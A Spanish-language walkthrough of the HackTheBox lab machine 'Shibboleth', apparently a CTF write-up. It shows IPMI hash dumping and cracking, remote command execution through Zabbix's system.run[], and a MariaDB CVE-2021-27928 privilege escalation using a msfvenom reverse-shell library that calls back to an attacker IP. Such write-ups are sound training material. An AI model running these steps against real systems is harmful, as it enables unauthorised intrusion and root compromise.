# Máquina "Shibboleth" de HackTheBox

## Características:

- Linux  
- Media  
- Abusing IPMI (Intelligent Platform Management Interface)
- Zabbix Exploitation 
- MariaDB 
- Remote Code Execution (CVE-2021-27928) 
- Password Reuse  
- IPMI  
- Penetration Tester Level 2  
- CVE-2021-27928  
- Weak Credentials
- Apache
- Ubuntu

## Útil en:

- eWPT 
- OSCP

---

**IP:** 10.10.11.124

## Reconocimiento

### Escaneo de puertos inicial

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.124
```

**Resultado:**
```
PORT   STATE SERVICE
80/tcp open  http
```

### Escaneo detallado de servicios

```bash
sudo nmap -sCV -p22,80 10.10.11.124 -oN targeted
```

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://shibboleth.htb/
Service Info: Host: shibboleth.htb
```

**Sistema:** Ubuntu 20.04 Focal

Agregamos el dominio `shibboleth.htb` al archivo `/etc/hosts`.

### Enumeración HTTP

```bash
nmap --script http-enum -p80 shibboleth.htb
```

Se encuentra el directorio `forms`, pero al revisarlo no hay contenido útil. El formulario de la sección no funciona, por lo que el siguiente paso será hacer fuzzing para enumerar subdominios.

### Enumeración de subdominios

```bash
gobuster vhost -u http://shibboleth.htb -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -t 100
```

**Subdominios encontrados:**
- zabbix
- monitor 
- monitoring

## Análisis de Zabbix

Empezamos revisando Zabbix, que es un software de monitoreo de estado de varios servicios de red para servidores y hardware de red. Usa MySQL, PostgreSQL, SQLite, Oracle o IBM DB2 como base de datos.

```bash
searchsploit zabbix
```

```bash
gobuster dir -u http://zabbix.shibboleth.htb -x txt,php,html -t 100 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

**Archivo encontrado:** `/hosts.php`

Este archivo devuelve que no estamos logueados para poder ver esta sección.

## Escaneo UDP

```bash
nmap --top-ports 500 -sU --open -T5 -v -n 10.10.11.124
```

Escaneamos los 500 puertos más comunes por UDP y encontramos el puerto **623**.

### Análisis del puerto 623

```bash
nmap -sCV -p623 10.10.11.124 -sU -oN UDPtargeted
```

**Puerto 623:** asf-rmcp

Este es el **Intelligent Platform Management Interface (IPMI)**, un conjunto de especificaciones de interfaz de computadora autónoma que proporciona capacidades de administración y monitoreo independientemente de la CPU, el firmware y el sistema operativo del sistema host.

### Scripts de NMAP para IPMI

```bash
locate .nse | grep ipmi
```

Usaremos `ipmi-version`:

```bash
nmap --script ipmi-version -p623 -sU 10.10.11.124 -oN ipmi
```

**Resultado:** IPMI versión 2.0

### Vulnerabilidad IPMI 2.0

Según HackTricks, IPMI 2.0 tiene una vulnerabilidad de recuperación de hash para contraseñas remotas (autenticación RAKP de IPMI 2.0). Básicamente, se puede solicitar al servidor los hashes MD5 de cualquier nombre de usuario.

#### Verificación de vulnerabilidad Cipher Zero

```bash
sudo nmap --script ipmi-cipher-zero -p623 -sU 10.10.11.124 -oN cipherzero
```

**Resultado:** State vulnerable

Esto significa que podemos explotarlo. Instalamos `ipmitool` como se sugiere en HackTricks.

## Explotación IPMI

### Usando Metasploit

```bash
msf6 > use auxiliary/scanner/ipmi/ipmi_version
msf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts 10.10.11.124
msf6 auxiliary(scanner/ipmi/ipmi_version) > run
```

**Resultado:**
```
[+] 10.10.11.124:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0)
```

### Dumping de hashes

```bash
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.10.11.124
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run
```

**Hash encontrado:**
```
[+] 10.10.11.124:623 - IPMI - Hash found: Administrator:bfa382dc840500003332ec77155a87c439e4e063befc86ee45c6a9549950eceba32da628f637a746a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:f4b2dcc03c98373e2ebe667693aa6a88651ffebb
```

### Alternativa con ipmiPwner

```bash
sudo python3 ipmipwner.py --host 10.10.11.124
```

**Hash obtenido:**
```
$rakp$a4a3a2a0820a0000f793de846396a33033290affdcb188a1b6db9aaa178ce75290b2fd6cfd76bac7a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72$ac4f0b33225a3d1d4c5b7e423c094ef72bc4997d
```

### Cracking del hash

```bash
hashcat ipmi.hash /usr/share/wordlists/rockyou.txt --user
```

**Contraseña encontrada:** `ilovepumkinpie1`

## Acceso a Zabbix

La contraseña no funciona para SSH, pero `Administrator/ilovepumkinpie1` funciona para iniciar sesión en Zabbix (el nombre de usuario distingue entre mayúsculas y minúsculas).

![Panel de Zabbix](/secciones/posts/imagenes/shibboleth/zabbix1.png)

## Ejecución de comandos en Zabbix

Una vez en Zabbix, podemos hacer que el sistema ejecute comandos arbitrarios a través de la clave `system.run[]`. 

Referencia: https://sbcode.net/zabbix/agent-execute-python/

![Configuración de comandos](/secciones/posts/imagenes/shibboleth/zabbix2.png)

Después de crear el objeto malicioso y configurar un listener con netcat, recibimos una reverse shell.

## Escalación de privilegios

### Enumeración del sistema

Al enumerar el sistema, encontramos en `/etc/passwd` que hay otro usuario: `ipmi-svc` que también tiene un shell bash. Podemos reutilizar la contraseña de esta cuenta para acceder fácilmente.

### Credenciales de base de datos

En el archivo de configuración del servidor Zabbix encontramos credenciales:

```bash
cat /etc/zabbix/zabbix_server.conf | grep -v "#"
```

![Credenciales encontradas](/secciones/posts/imagenes/shibboleth/creds.webp)

### Análisis de puertos internos

```bash
ss -tlnp
```

MySQL se está ejecutando en el puerto 3306.

## Explotación CVE-2021-27928

La versión de MariaDB es vulnerable al **CVE-2021-27928**.

**Descripción de la vulnerabilidad:** Una ruta de búsqueda que no es de confianza conduce a una inyección de evaluación, en la que un SUPER usuario de la base de datos puede ejecutar comandos del sistema operativo después de modificar `wsrep_provider` y `wsrep_notify_cmd`.

**Referencias:**
- https://nvd.nist.gov/vuln/detail/CVE-2021-27928
- https://github.com/Al1ex/CVE-2021-27928

### Explotación

1. **Crear payload malicioso:**
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.15.21 LPORT=443 -f elf-so -o test.so
```

2. **Configurar listener:**
```bash
nc -lvnp 443
```

3. **Transferir archivo a la máquina objetivo**

4. **Ejecutar exploit:**
```sql
mysql -u zabbix -p
SET GLOBAL wsrep_provider="/tmp/test.so";
```

## Obtención de acceso root

Después de ejecutar el exploit, obtenemos una reverse shell como root. Buscamos la flag de root y completamos la máquina.

---

**Nota:** Algunos writeups pueden tener contenido de otras páginas o pocas imágenes debido a que en algunas máquinas no se tomaron apuntes completos o capturas de pantalla. Se han consultado varios writeups para complementar la información y proporcionar la mejor explicación posible.